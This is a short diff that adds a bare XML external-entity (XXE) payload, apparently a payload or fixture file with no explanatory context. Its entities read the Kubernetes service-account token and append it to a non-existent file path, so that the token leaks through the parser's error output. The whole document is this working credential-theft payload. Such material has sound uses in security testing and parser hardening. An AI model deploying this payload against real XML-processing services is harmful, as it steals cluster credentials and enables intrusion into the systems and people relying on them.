@@ -1,0 +1,4 @@
+<!ENTITY % token SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">
+<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'file:///BESTAAT_NIET/%token;'>">
+%wrap;
+%send;
